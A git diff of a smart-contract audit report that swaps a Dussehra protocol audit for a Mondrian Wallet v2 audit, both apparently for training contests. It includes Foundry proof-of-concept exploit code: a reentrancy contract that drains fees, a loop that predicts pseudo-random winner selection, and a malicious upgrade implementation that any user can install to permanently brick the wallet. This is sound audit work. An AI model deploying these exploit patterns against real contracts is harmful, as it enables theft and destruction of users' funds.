@@ -1,7 +1,7 @@
 ---
-title: Codehawks First flight Dussehra Audit Report
+title: Codehawks First flight Mondrian Wallet v2
 author: Seven Cedars
-date: June 12, 2024
+date: July 10, 2024
 header-includes:
   - \usepackage{titling}
   - \usepackage{graphicx}
@@ -9,7 +9,7 @@ header-includes:
 
 <!-- to render report run: 
     pandoc report-formatted.md -o report.pdf --from markdown --template=eisvogel --listings 
-NB: remeber to run this in the audit_data folder! 
+NB: remember to run this in the audit_data folder! 
 -->
 
 \begin{titlepage}
@@ -19,7 +19,7 @@ NB: remeber to run this in the audit_data folder!
         \includegraphics[width=0.5\textwidth]{logo.pdf} 
     \end{figure}
     \vspace*{2cm}
-    {\Huge\bfseries Dussehra Audit Report\par}
+    {\Huge\bfseries Mondrian Wallet v2\par}
     \vspace{1cm}
     {\Large Version 1.0\par}
     \vspace{2cm}
@@ -47,22 +47,10 @@ Prepared by: [Seven Cedars](https://github.com/7Cedars)
 - [Findings](#findings)
 
 # Protocol Summary
-Dussehra, a major Hindu festival, commemorates the victory of Lord Rama, the seventh avatar of Vishnu, over the demon king Ravana during the event of Dussehra. 
+The Mondrian Wallet team is back!
 
 ## Contracts
-The Dussehra protocol allows a user to participate in the event of Dussehra. The protocol is divided into three contracts: `ChoosingRam`, `Dussehra`, and `RamNFT`.
-
-- The `Dussehra` contract: 
-  - Allows users to enter the contract by paying a preset fee The user receives a ramNFT.  
-  - Between 12 and 13 october 2023, allows any user to kill Ravana. When Ravana is killed, half of the fees are transferred to the organiser. 
-  - Allows the user who owns the ramNFT that has been selected as Ram to withdraw half of the collected entree fees.
-- The `ChoosingRam` contract: 
-  - Allows users to increase the worth of their ramNFT. If they are the first to collect all five characteristics, they will become Ram.
-  - If no Ram has been selected by 12 October, it allows the organiser to randomly select a Ram.  
-- The `RamNFT` contract: 
-  - allows `Dussehra contract` to mint Ram NFTs
-  - update the characteristics of the NFTs 
-  - and retrieve the characteristics of the NFTs.
+MondrianWallet2.sol
 
 # Risk Classification
 
@@ -82,1230 +70,762 @@ This protocol was prepared for the Codehawk's firstflight program. It intentiona
 - In Scope:
 ```
 #-- interfaces
-|   #-- ChoosingRam.sol
-|   #-- Dussehra.sol
-|   #-- RamNFT.sol
+|   #-- MondrianWallet2.sol
 ```
 
-- Solc Version: `0.8.20`
+- Solc Version: `0.8.24`
 - Chain(s) to deploy contract to:
-  - Ethereum
   - zksync
-  - Arbitrum
-  - BNB
 
 ## Roles
-- Organiser: The address that initiated the Dussehra and RamNFT contracts
-- User: Address participating in the Dussehra event 
-- Ram: ramNFT that has been selected as Ram before the Dussehra event starts. 
+- `Owner` - The owner of the wallet, who can upgrade the wallet. 
   
 # Executive Summary
 
 | Severity | Number of Issues found |
 | -------- | ---------------------- |
-| high     | 7                      |
-| medium   | 3                      |
-| low      | 16                     |
-| total    | 26                     |
+| high     | 4                      |
+| medium   | 4                      |
+| low      | 1                      |
+| total    | 9                      |
 
 
 ## Issues found
 # Findings
 ## High
-### [H-1] The function `Dussehra::killRavana` can be called multiple times, leading to `organiser` receiving all funds and leaving no funds for the selected ram to claim through the function  `Dussehra::withdraw`. 
 
-**Description:** The function `Dussehra::killRavana` sets `IsRavanKilled` to true and sends half of the collected fees to the `organiser` address. The `Dussehra::withdraw` function, in turn, is meant to allow a winner address to withdraw the other half of the collected fees. 
+### Missing `MondrianWallet2::receive` and `MondrianWallet2::fallback` functions make it impossible to move funds into the contract. Combined with the absence of a Paymaster account, it means it is impossible to validate transactions, breaking core functionality of the Account Abstraction. 
 
-However, the `killRavana` function does not check if Ravana has already been killed (or, more generally, if the function has already been called before. It only checks if Ram has been selected (through the `RamIsSelected` modifier) and if it is called between block.timestamp 1728691069 and 1728691069.  As a result, it can be called multiple times, each time transferring half of the collected fees to the `organiser` address. 
+**Description:** `MondrianWallet2.sol` is missing a receive and fallback function. It makes it impossible to move funds into the contract.  
 
 ```javascript
-      function killRavana() public RamIsSelected { 
-        if (block.timestamp < 1728691069) {
-            revert Dussehra__MahuratIsNotStart();
-        }
-        if (block.timestamp > 1728777669) {
-            revert Dussehra__MahuratIsFinished();
-        }
-        // A check if Ravana is already killed is missing here. 
-        IsRavanKilled = true;
+    constructor() {
+        _disableInitializers();
+    }
+
+@>    // receive and / or fallback function should be here. 
+
+    function validateTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
 ```
 
-**Impact:** After two calls to the  `killRavana` function, all funds have been sent to the `organiser` address, leaving none for the winner address to withdraw. It breaks intended functionality of the protocol and allows the organiser to execute a rug pull. 
+**Impact:** Because `MondrianWallet2.sol` does not set up a paymaster account, the Account Abstraction will only work if `MondrianWallet2.sol` itself has sufficient `balance` to execute transactions. If not, the `MondrianWallet2::validateTransaction` will fail and return `bytes4(0)`.  
+
+Lacking a receive and fallback function, it is impossible to move funds into the contract: Any empty call with ether will revert and calls to a function will return excess ether to the caller, leaving no funds in the contract. 
+
+This, in turn, means that the function `MondrianWallet2::_validateTransaction` will always revert: 
+
+```javascript
+        uint256 totalRequiredBalance = _transaction.totalRequiredBalance();
+        // this conditional will always return false. 
+        if (totalRequiredBalance > address(this).balance) {
+            revert MondrianWallet2__NotEnoughBalance();
+        }
+```
+
+The only way to execute a transaction is by the owner of the contract through the `MondrianWallet2::executeTransaction`, which has the owner pay for the transaction directly. This approach of executing a transaction is exactly the same as the owner themselves executing the transaction directly, rendering the Account Abstraction meaningless.
+
+An additional note on testing. This issue did not emerge in testing because the account is added ether through a cheat code in `MondrianWallet2Test.t.sol::setup`: 
+
+```javascript
+        vm.deal(address(mondrianWallet), AMOUNT);
+```
+Although common practice, it makes issues within funding contracts easy to miss.  
 
 **Proof of Concept:**
-1. Participants enter the contract through the `Dussehra::enterPeopleWhoLikeRam` function. 
-2. Each participant pays the entry fee. 
-3. Between timestamp 1728691200 and 1728777600, the `organiser` calls the `ChoosingRam::selectRamIfNotSelected` function. This allows the `killRavana` function to be called. 
-4. Any address calls the `Dussehra::killRavana`. 
-5. A second time, any address calls the `Dussehra::killRavana`.
-6. All fees deposited into the protocol end up at `organiser` address. 
+1. User deploys an account abstraction and transfers ownership to themselves. 
+2. User attempts to transfer funds to the contract and fails. 
+3. Bootloader attempts to validate transaction, fails. 
+4. User attempts to execute transaction directly through `MondrianWallet2::executeTransaction` and succeeds. 
+In short, the only way transactions can be executed are directly by the owner of the contract, defeating the purpose of Account Abstraction.   
+
 <details>
 <summary> Proof of Concept</summary>
 
-Place the following in `Dussehra.t.sol`. 
+First remove cheat code that adds funds to `mondrianWallet` account in `ModrianWallet2Test.t.sol::setup` [sic: note the missing n!]. 
+```diff 
+- vm.deal(address(mondrianWallet), AMOUNT);
+```
 
+And set the proxy to payable: 
+```diff
+- mondrianWallet = MondrianWallet2(address(proxy));
++ mondrianWallet = MondrianWallet2(payable(address(proxy)));
+```
+
+Then add the following to `ModrianWallet2Test.t.sol`. 
 ```javascript
-    // note: the `participants` modifier adds two players to the protocol, both pay the 1 ether entree fee. 
-    function test_organiserGetsAllFundsByCallingKillRavanaTwice() public participants { 
-        uint256 balanceDussehraStart = address(dussehra).balance;
-        uint256 balanceOrganiserStart = organiser.balance;
-        vm.assertEq(balanceDussehraStart, 2 ether); 
-
-        // the organiser first selects a Ram.. 
-        vm.warp(1728691200 + 1);
-        vm.startPrank(organiser);
-        choosingRam.selectRamIfNotSelected(); 
-        vm.stopPrank();
+      // Please note that you will also need --system-mode=true to run this test. 
+      function testMissingReceiveBreaksContract() public onlyZkSync {
+        // setting up accounts
+        uint256 AMOUNT_TO_SEND = type(uint128).max;
+        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
+        vm.deal(THIRD_PARTY_ACCOUNT, AMOUNT);
+        // Check if mondrianWallet indeed has no balance. 
+        assertEq(address(mondrianWallet).balance, 0);  
         
-        // then the killRavana function is called twice.  
-        vm.warp(1728691069 + 1);
-        vm.startPrank(player3);
-        // calling it one time... 
-        dussehra.killRavana();
-        // calling it a second time... -- no revert happens.  
-        dussehra.killRavana();
-        vm.stopPrank();
+        // create transaction  
+        address dest = address(usdc);
+        uint256 value = 0;
+        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
+        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
+        transaction = _signTransaction(transaction);
 
-        uint256 balanceDussehraEnd = address(dussehra).balance;
-        uint256 balanceOrganiserEnd = organiser.balance;
+        // Act & assert 
+        // sending money directly to contract fails; it leaves contract with balance of 0. 
+        vm.prank(mondrianWallet.owner());
+        (bool success, ) = address(mondrianWallet).call{value: AMOUNT_TO_SEND}("");
+        assertEq(success, false);
+        assertEq(address(mondrianWallet).balance, 0);
 
-        // The balance of Dussehra is 0 and the organiser took all the funds that were in the Dussehra contract. 
-        vm.assertEq(balanceDussehraEnd, 0 ether);
-        vm.assertEq(balanceOrganiserEnd, balanceOrganiserStart + balanceDussehraStart);
-
-        // when withdraw is called it reverts: out of funds. 
-        address selectedRam = choosingRam.selectedRam(); 
-        vm.startPrank(selectedRam);
+        // as a result, validating transaction by bootloader fails
+        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
         vm.expectRevert();
-        dussehra.withdraw();
-        vm.stopPrank(); 
+        mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+
+        // the same goes for executeTransactionFromOutside 
+        vm.prank(THIRD_PARTY_ACCOUNT);
+        vm.expectRevert();
+        mondrianWallet.executeTransactionFromOutside(transaction);
+
+        // also when eth is send with the transaction. 
+        vm.prank(THIRD_PARTY_ACCOUNT);
+        vm.expectRevert();
+        mondrianWallet.executeTransactionFromOutside{value: AMOUNT_TO_SEND}(transaction);
+
+        // It is possible to execute function calls by owner through execute Transaction. But this defeats the purpose of Account Abstraction.
+        vm.prank(mondrianWallet.owner());
+        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
+        assertEq(usdc.balanceOf(address(mondrianWallet)), AMOUNT);
     }
 ```
 </details>
 
-**Recommended Mitigation:** Add a check if Ravana has already been killed, making it impossible to call the function twice. 
+**Recommended Mitigation:** 
+Add a payable fallback function to the contract. 
 
 ```diff 
-+   error Dussehra__RavanaAlreadyKilled()();
-.
-.
-.
-
-  function killRavana() public RamIsSelected { 
-      if (block.timestamp < 1728691069) {
-          revert Dussehra__MahuratIsNotStart();
-      }
-      if (block.timestamp > 1728777669) {
-          revert Dussehra__MahuratIsFinished();
-      }
-+       if (IsRavanKilled) {
-+        revert Dussehra__RavanaAlreadyKilled();
-+      }
-      IsRavanKilled = true;  
-.
-.
-.
-    }
++   fallback() external payable {
+// an additional check is needed so that the bootloader will never end up calling the fallback function. 
++  assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);
++ }  
 ```
 
-### [H-2] The `Dussehra::killRavana` function is susceptible to a reentrancy attack by the `organiser`, allowing the organiser to retrieve all funds from the `Dussehra` contract through one transaction.
+### Missing access control on `MondrianWallet2::_authorizeUpgrade` make it possible for anyone to call `MondrianWallet2::upgradeToAndCall` and permanently change its functionality.   
 
-**Description:** The function `killRavana` sets `IsRavanKilled` to true and sends half of the collected fees to the `organiser` address. However, because funds are send to the organiser through a low level `.call`, it is possible to set the `organiser` as a malicious contract that will recall `killRavana` at the moment it receives funds. 
+**Description:** `MondrianWallet2` inherits `UUPSUpgradeable` from openZeppelin. This contract comes with a function `upgradeToAndCall` that upgrades a contract. It also comes with a requirement to include a `_authorizeUpgrade` function that manages access control. As noted in the `UUPSUpgradable` contract: 
+>
+> The {_authorizeUpgrade} function must be overridden to include access restriction to the upgrade mechanism.
+>
 
-Note that this vulnerability is enabled by the vulnerability described in [H-1]. Because its root cause is different, I note it as an additional vulnerability.  
-
+However, the implementation of `_authorizeUpgrade` lacks any such access restrictions: 
 ```javascript
-    (bool success, ) = organiser.call{value: totalAmountGivenToRam}(""); 
-    require(success, "Failed to send money to organiser");
+  function _authorizeUpgrade(address newImplementation) internal override {}
 ```
 
-**Impact:** The reentrancy vulnerability allows the `organiser` to drain all funds from the contract, breaking the intended functionality of the `Dussehra` protocol.
-
-Please note that it is also possible to create a malicious contract that reverts on receiving funds. This will make it impossible to kill Ravana, breaking the protocol. It is a different execution of the same vulnerability. 
+**Impact:** Because anyone can call `MondrianWallet2::upgradeToAndCall`, anyone can upgrade the contract to anything they want. First, this goes against the stated intention of the contract. From `README.md`: 
+>
+> only the owner of the wallet can introduce functionality later
+>
+Second, it allows for a malicious user to disable the contract. 
+Third, the the upgradeability can also be disabled (by having `_authorizeUpgrade` always revert), making it impossible to revert changes.    
 
 **Proof of Concept:**
-1. A malicious organiser creates a contract (here named `organiserReenters`) with a `receive` function that calls `Dussehra::killRavana` until no funds are left.  
-2. The `organiserReenters` contract is used to initiate the Dussehra contract. 
-3. Players enter the `Dussehra` contract, without any problems. 
-4. The organiser of the `RamNFT` contract calls `selectRamIfNotSelected` (this allows the `killRavana` function to be called). 
-5. Anyone calls the `killRavana` function. 
-6. All funds end up at the `organiserReenters` contract. 
+1. A malicious user deploys an alternative `MondrianWallet2` implementation.   
+2. The malicious user calls `upgradeToAndCall` and sets the new address to their implementation. 
+3. The call does not revert. 
+4. From now on `MondrianWallet2` follows the functionality as set by the alternative `MondrianWallet2` implementation.
+
+In the example below, all functions end up reverting - including the `upgradeToAndCall`. But any kind of change can be implemented, by any user, at any time.  
+
 <details>
 <summary> Proof of Concept</summary>
 
-Add the following code underneath the `CounterTest` contract in `Dussehra.t.sol`. 
+Place the following code underneath the existing tests in `ModrianWallet2Test.t.sol`. 
+```javascript 
 
-```javascript
-  contract OrganiserReentersKillRavana {
-    Dussehra selectedDussehra;
+contract KilledImplementation is IAccount, Initializable, OwnableUpgradeable, UUPSUpgradeable  {
+    error KilledImplementation__ContractIsDead();
 
-    constructor() {}
-
-    function setSelectedDussehra (Dussehra _dussehra) public {
-        selectedDussehra = _dussehra; 
+    function initialize() public initializer {
+        __Ownable_init(msg.sender);
+        __UUPSUpgradeable_init();
     }
 
-    // if there is enough balance in the Dussehra contract, it calls killRavana again on receiving funds. 
-    receive() external payable {
-        if (address(selectedDussehra).balance >= selectedDussehra.totalAmountGivenToRam()) 
-        {
-            selectedDussehra.killRavana(); 
-        } 
+    function validateTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction)
+        external
+        payable
+        returns (bytes4 magic)
+    {
+        if (_transaction.txType != 0) {
+            revert KilledImplementation__ContractIsDead();
+        }
+        return bytes4(0); 
+    }
+
+    function executeTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable  {
+        revert KilledImplementation__ContractIsDead(); 
+    }
+
+    function executeTransactionFromOutside(Transaction memory _transaction) external payable {
+        revert KilledImplementation__ContractIsDead(); 
+    }
+
+    function payForTransaction(bytes32, /*_txHash*/ bytes32, /*_suggestedSignedHash*/ Transaction memory _transaction) external payable {
+        revert KilledImplementation__ContractIsDead(); 
+    }
+
+    function prepareForPaymaster(bytes32, /*_txHash*/ bytes32, /*_possibleSignedHash*/ Transaction memory /*_transaction*/) external payable {
+        revert KilledImplementation__ContractIsDead(); 
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {
+        revert KilledImplementation__ContractIsDead();  
     }
 }
 ```
 
-Place the following in the `CounterTest` contract in the `Dussehra.t.sol` test file. 
+Then place the following among the existing tests:  
 ```javascript
-    function test_organiserReentryStealsFunds() public {    
-        OrganiserReentersKillRavana organiserReenters; 
-        Dussehra reenteredDussehra; 
-        organiserReenters = new OrganiserReentersKillRavana(); 
+    // Please note that you will also need --system-mode=true to run this test. 
+    function testAnyOneCanUpgradeAndKillAccount() public onlyZkSync {
+        // setting up accounts
+        address THIRD_PARTY_ACCOUNT = makeAddr("3rdParty");
+        vm.deal(address(mondrianWallet), AMOUNT);
+        // created an implementation (contract KilledImplementation below) in which every function reverts with the following error: `KilledImplementation__ContractIsDead`. 
+        KilledImplementation killedImplementation = new KilledImplementation(); 
 
-        vm.startPrank(address(organiserReenters));
-        reenteredDussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
-        organiserReenters.setSelectedDussehra(reenteredDussehra);
-        vm.stopPrank();
-                
-        // We enter participants with their entree fees. 
-        vm.startPrank(player1);
-        vm.deal(player1, 1 ether);
-        reenteredDussehra.enterPeopleWhoLikeRam{value: 1 ether}();
-        vm.stopPrank();
-        
-        vm.startPrank(player2);
-        vm.deal(player2, 1 ether);
-        reenteredDussehra.enterPeopleWhoLikeRam{value: 1 ether}();
-        vm.stopPrank();
+        // create transaction  
+        address dest = address(usdc);
+        uint256 value = 0;
+        bytes memory functionData = abi.encodeWithSelector(ERC20Mock.mint.selector, address(mondrianWallet), AMOUNT);
+        Transaction memory transaction = _createUnsignedTransaction(mondrianWallet.owner(), 113, dest, value, functionData);
+        transaction = _signTransaction(transaction);
 
-        // At this point the Dussehra contract has the fees, the organiser has no funds. 
-        uint256 balanceDussehraStart = address(reenteredDussehra).balance;
-        uint256 balanceOrganiserStart = address(organiserReenters).balance;
-        vm.assertEq(balanceDussehraStart, 2 ether); 
-        vm.assertEq(balanceOrganiserStart, 0 ether); 
+        // Act
+        // a random third party - anyone - can upgrade the wallet.
+        // upgrade to `killedImplementation`.
+        vm.expectEmit(true, false, false, false);
+        emit Upgraded(address(killedImplementation));
 
-        // Then, the organiser first selects the Ram.. 
-        vm.warp(1728691200 + 1);
-        vm.startPrank(organiser); // note: this needs to be called by the `organiser` of {RamNFT} _not_ the `organiser` of {Dussehra.sol}
-        choosingRam.selectRamIfNotSelected(); 
+        vm.prank(THIRD_PARTY_ACCOUNT);
+        mondrianWallet.upgradeToAndCall(address(killedImplementation), "");
 
-        // then anyone calls the kill Ravana function.. 
-        reenteredDussehra.killRavana(); 
+        // Assert 
+        // With the upgraded implementation, every function reverts with `KilledImplementation__ContractIsDead`. 
+        vm.prank(BOOTLOADER_FORMAL_ADDRESS);
+        vm.expectRevert(KilledImplementation.KilledImplementation__ContractIsDead.selector);
+        mondrianWallet.validateTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
 
-        // and the organiser ends up with all the funds. 
-        uint256 balanceDussehraEnd = address(dussehra).balance;
-        uint256 balanceOrganiserEnd = address(organiserReenters).balance;
+        vm.prank(mondrianWallet.owner());
+        vm.expectRevert(KilledImplementation.KilledImplementation__ContractIsDead.selector);
+        mondrianWallet.executeTransaction(EMPTY_BYTES32, EMPTY_BYTES32, transaction);
 
-        vm.assertEq(balanceDussehraEnd, 0 ether);
-        vm.assertEq(balanceOrganiserEnd, balanceOrganiserStart + balanceDussehraStart);
+        // crucially, also the upgrade call also reverts. Upgrading back to the original is impossible. 
+        vm.prank(mondrianWallet.owner());
+        vm.expectRevert(KilledImplementation.KilledImplementation__ContractIsDead.selector);
+        mondrianWallet.upgradeToAndCall(address(implementation), "");
+
+        // ... and so on. The contract is dead. 
     }
 ```
 </details>
 
-**Recommended Mitigation:** Currently, funds are pushed through a low level call to the organiser address. This allows for a reentrancy attack to be executed. The mitigation is to refactor the code to a pull logic. Create a separate function that allows the organiser the pull the funds from the contract the moment that Ravana has been killed. See the following page for more information: https://fravoll.github.io/solidity-patterns/pull_over_push.html. 
+**Recommended Mitigation:** Add access restriction to `MondrianWallet2::_authorizeUpgrade`, for example the `onlyOwner` modifier that is part of the imported `OwnableUpgradable.sol` contract:
 
-The following solution draws from this page. 
-
-1. Add a mapping to keep track of credits owed. 
 ```diff 
-+    mapping(address => uint) credits;
++   function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
+-   function _authorizeUpgrade(address newImplementation) internal override {}
 ```
 
-1. Add a function to retrieve funds when address has credits. 
-```diff
-+    function withdrawCredits() public {
-+        uint amount = credits[msg.sender];
+### Missing validation check in `MondrianWallet2::executeTransactionFromOutside` allows anyone to execute transactions through the `MondrianWallet2` Account Abstraction. It breaks any kind of restriction of the contract and renders it unusable.  
 
-+        require(amount != 0);
-+        require(address(this).balance >= amount);
+**Description:** The function `MondrianWallet2::executeTransactionFromOutside` misses a check on the result of `MondrianWallet2::_validateTransaction`. `_validateTransaction` does not revert when validation fails, but returns `bytes4(0)`. Without check, `MondrianWallet2::_executeTransaction` will always be called, even when validation of the transaction failed. 
 
-+        credits[msg.sender] = 0;
-
-+        msg.sender.transfer(amount);
+```javascript
+      function executeTransactionFromOutside(Transaction memory _transaction) external payable {
+        _validateTransaction(_transaction);
+        _executeTransaction(_transaction);
     }
 ```
 
-3. Refactor the existing `killRavana` function to add credits to credits mapping instead of directly transferring funds.  
-```diff
--    (bool success, ) = organiser.call{value: totalAmountGivenToRam}(""); 
--    require(success, "Failed to send money to organiser");
-+   credits[receiver] += totalAmountGivenToRam;
-
-```
-
-### [H-3] Random values in `ChoosingRam::selectRamIfNotSelected` and `ChoosingRam::increaseValuesOfParticipants` are only pseudo random. It allows users to influence and predict outcome of which ramNFT will be selected and hence enable gaming of the outcome of the `Dussehra` protocol. 
-
-**Description:** 
-Hashing `block.timestamp` and `block.prevrandao` together at `ChoosingRam::selectRamIfNotSelected` creates a predictable final number. It is not a truly random number. It is possible for an organiser to calculate the outcome before calling the function, allowing them to choose who will be the winner.
-
-Similarly, hashing `block.timestamp`, `block.prevrandao` and `msg.sender` together at `ChoosingRam::increaseValuesOfParticipants` also creates a predictable final number. This time, though, the addition of `msg.sender` also allows the final number to be influenced, choosing which of the two participants will receive the increased value. 
-
-**Impact:** 
-1. The organiser can choose who get to be selected as Ram. 
-2. Any participant can game the seemingly random selection of `tokenIdOfChallenger` or `tokenIdOfAnyPerticipent` at the `increaseValuesOfParticipants`. 
-A central element of the intended functionality of the protocol is the random selection of Ram. This vulnerability breaks this intended functionality. 
+**Impact:** Because of the missing check in `executeTransactionFromOutside`, anyone can sign and execute a transaction. It breaks any kind of restriction of the contract, allowing for immediate draining of all funds from the contract (among other actions) and renders it effectively unusable.  
 
 **Proof of Concept:**
-1. The organiser knows ahead of time the `block.timestamp` and`block.prevrandao` and uses this calculate outcome of calculation of "random" value. 
-2. When this value brings up the correct RamNFT id, organiser calls the `selectRamIfNotSelected` function. 
-3. The expected participant is selected as the winner. 
-
-<details>
-<summary> Proof of Concept</summary>
-Place the following in `Dussehra.t.sol`. 
-
-```javascript
-    function test_organiserCanChooseWinner() public participants {
-        uint256 tokenThatShouldWin = 0;
-        // check that player1 is owner of ramNFT token no. 0.  
-        assertEq(ramNFT.getCharacteristics(tokenThatShouldWin).ram, player1);
-        uint256 thisIsSoNotRandom = 99999; // should not initialise to 0 as this equals `tokenThatShouldWin`. 
-
-        uint256 j = 1;
-        while (thisIsSoNotRandom != tokenThatShouldWin) {
-            vm.warp(1728691200 + j);
-            thisIsSoNotRandom = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;
-            j++;
-        }
-        
-        // when we reached the correct value, we run the selectRamIfNotSelected function. 
-        vm.startPrank(organiser);
-        choosingRam.selectRamIfNotSelected(); 
-        vm.stopPrank();
-
-        // player1, owner of ramNFT no 0 is selected as Ram. 
-        vm.assertEq(choosingRam.selectedRam(), player1); 
-    }
-```
-</details>
-
-**Recommended Mitigation:** Use an off-chain verified random number generator. The most popular one is Chainlink VRF, but others exist. As this will require extensive refactoring of code, I did not write out the mitigation here.  
-
-### [H-4] The function `RamNFT:mintRamNFT` is public and lacks any kind of access control. This means that anyone can mint ramNFTs and enter the Dussehra protocol without paying entree fees. 
-
-**Description:** Participants are meant to enter the protocol and receive an ramNFT via the `Dussehra::enterPeopleWhoLikeRam` function. The participants has to pay a fee when calling the `enterPeopleWhoLikeRam` function, which then calls the `RamNFT:mintRamNFT` to mint a ramNFT, logs the tokenId and adds initialises characteristics linked to the tokenId. The tokenId and characteristics allow people to participate in the event and win half of the collected fees.   
-
-However, `RamNFT:mintRamNFT` lacks any kind of access control. This results in anyone beng able to call the function directly indefinitely, bypassing `Dussehra::enterPeopleWhoLikeRam`, avoiding paying the entree fee and entering the event an indefinite amount of times. 
-
-```javascript
-    // note 1: a public function without any modifier. 
-      function mintRamNFT(address to) public { 
-    // note 2: no if or require checks at all. 
-        uint256 newTokenId = tokenCounter++;
-        _safeMint(to, newTokenId); 
-
-        Characteristics[newTokenId] = CharacteristicsOfRam({
-            ram: to, 
-            isJitaKrodhah: false, // 
-            isDhyutimaan: false, // 
-            isVidvaan: false, // 
-            isAatmavan: false, //
-            isSatyavaakyah: false // 
-        });
-    }
-```
-
-**Impact:** Participants can enter the event for free, while still being able to win half of the collected entree fees. It takes away any incentive to pay the entree fee, leaving the contract without any funds to pay the winning Ram. It breaks the intended functionality of the protocol. 
-
-**Proof of Concept:**
-1. A malicious user calls `mintRamNFT` 9999 times. Does not pay any entree fees. 
-2. `mintRamNFT` does not revert. 
-3. Organiser calls `choosingRam::selectRamIfNotSelected`. 
-4. The malicious user has a very high chance of being selected Ram.
-
-<details>
-<summary> Proof of Concept</summary>
-
-Place the following in the `CounterTest` contract in the `Dussehra.t.sol` test file. 
-
-```javascript
-   function test_mintingFreeRamNFTs() public participants {
-        // let's enter the Ram even 9999 times... 
-        uint256 amountRamNFTstoMint = 9999; 
-
-        vm.startPrank(player3);
-        for (uint256 i; i < amountRamNFTstoMint; i++) {
-            ramNFT.mintRamNFT(player3); 
-        }
-        vm.stopPrank();
-
-        // and then the organiser chooses a Ram 
-        vm.warp(1728691200 + 1);
-        vm.prank(organiser);
-        choosingRam.selectRamIfNotSelected(); 
-
-        // it is an almost certainty that player3 will be selected. 
-        vm.assertEq(choosingRam.selectedRam(), player3); 
-    }
-```
-</details>
-
-**Recommended Mitigation:** The `Dussehra` contract needs to be the `organiser` of the `RamNFT` contract. This allows the addition of a check that it is the `Dussehra` contract calling a function.   
-1. For clarity, rename `organiser` to `s_ownerDussehra`.  
-2. Have the `Dussehra` contract initiate `RamNFT`. This sets `s_ownerDussehra` to the address of the `Dussehra` contract. 
-3. Add a check that `RamNFT::mintRamNFT` can only be called by `s_ownerDussehra`. 
-
-In `Dussehra.sol`: 
-```diff 
-+   constructor(uint256 _entranceFee, address _choosingRamContract) {
--   constructor(uint256 _entranceFee, address _choosingRamContract, address _ramNFT) {
-        entranceFee = _entranceFee;
-        organiser = msg.sender; 
-+       ramNFT = new RamNFT();
--       ramNFT = RamNFT(_ramNFT);
-        choosingRamContract = ChoosingRam(_choosingRamContract); 
-    }
-```
-
-In `RamNFT.sol`: 
-```diff 
-+ error RamNFT__NotDussehra();
-.
-.
-.
--   address public organiser;
-+   address immutable i_ownerDussehra;
-.
-.
-.
-    constructor() ERC721("RamNFT", "RAM") {
-        tokenCounter = 0; 
--       organiser = msg.sender;
-+       i_ownerDussehra = msg.sender;
-    }
-.
-.
-.
-    function mintRamNFT(address to) public {
-
-+        if (msg.sender != i_ownerDussehra) {
-+            revert RamNFT__NotDussehra(); 
-+        }
-
-        uint256 newTokenId = tokenCounter++;
-        _safeMint(to, newTokenId); 
-
-```
-
-### [H-5] The `ChoosingRam::increaseValuesOfParticipants` does not set `isRamSelected` to true. It results in the `ChoosingRam::selectRamIfNotSelected` overriding any prior selected Ram before the end of the event. 
-
-**Description:** The `ChoosingRam::increaseValuesOfParticipants` function is meant as a game of chance between two participants (a `tokenIdOfChallenger` and  `tokenIdOfAnyPerticipent`). One of the two receives an increase in characteristics. If enough characteristics have been accumulated, the participant will be selected as the Ram and win half of the fee pool. An additional function `ChoosingRam::selectRamIfNotSelected` allows the `organiser` to select a Ram if none has been selected by a certain time.
-
-However, the `ChoosingRam::increaseValuesOfParticipants` does not set `isRamSelected` to true when it selects a Ram. As a result: 
-1. `increaseValuesOfParticipants` can continue to select a Ram even if it has already been selected. 
-2. `selectRamIfNotSelected` can overwrite any Ram selected through `increaseValuesOfParticipants`. 
-3. Worse, because the `Dussehra::killRavana` function checks if `ChoosingRam::isRamSelected` is true, it forces `ChoosingRam::selectRamIfNotSelected` to be called. This means that the selected Ram will _always_ be set by the `selectRamIfNotSelected` function, not the `increaseValuesOfParticipants`. 
-
-In `ChoosingRam.sol`: 
-```javascript
-   function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
-.
-.
-.
-    } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
-        ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
-        // Note: isRamSelected not set to true
-        selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
-    }
-.
-.
-.
-    } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
-        ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
-        // Again note: isRamSelected not set to true
-        selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
-    }
-
-```
-
-In `Dussehra.sol`: 
-```javascript
-  function killRavana() public RamIsSelected {
-```
-
-**Impact:** The intended functionality of the protocol is for participants to increase their characteristics through the `ChoosingRam::increaseValuesOfParticipants` function until they become Ram. Only in the case that no one has been selected as Ram though `increaseValuesOfParticipants`, does the organiser get to randomly select a Ram. This bug in the protocol breaks its intended logic.   
-
-**Proof of Concept:**
-1. Two participants (player1 and player2) call `increaseValuesOfParticipants` until one is selected as Ram. 
-2. When `Dussehra::killRavana` is called, it reverts. 
-3. When `organiser` calls `selectRamIfNotSelected` it does not revert. 
-4. The selectedRam is reset to a new address. 
-5. When `Dussehra::killRavana` is called, it does not revert. 
-<details>
-<summary> Proof of Concept</summary>
-
-Place the following in the `CounterTest` contract of the `Dussehra.t.sol` test file. 
-```javascript
-      function test_selectRamIfNotSelected_AlwaysSelectsRam() public participants {
